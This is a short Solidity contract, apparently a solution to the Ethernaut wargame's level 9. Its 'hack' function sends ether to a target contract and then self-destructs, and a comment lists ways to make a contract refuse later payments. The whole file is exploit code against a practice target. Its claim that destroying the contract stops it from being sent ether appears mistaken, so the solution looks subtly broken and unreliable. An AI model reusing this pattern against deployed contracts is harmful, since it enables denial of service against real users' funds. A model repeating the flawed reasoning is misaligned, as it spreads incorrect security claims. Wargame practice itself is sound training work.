// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

contract Ethernaut09 {
    // to solve this level, can not implement a fallback function, implement a malicious fallback function that reverts the transaction, or destroy the contract so that it cannot be sent ether
    function hack(address _address) public payable {
        address payable addr = payable(_address);
        addr.transfer(msg.value);
        selfdestruct(payable(msg.sender));
    }
}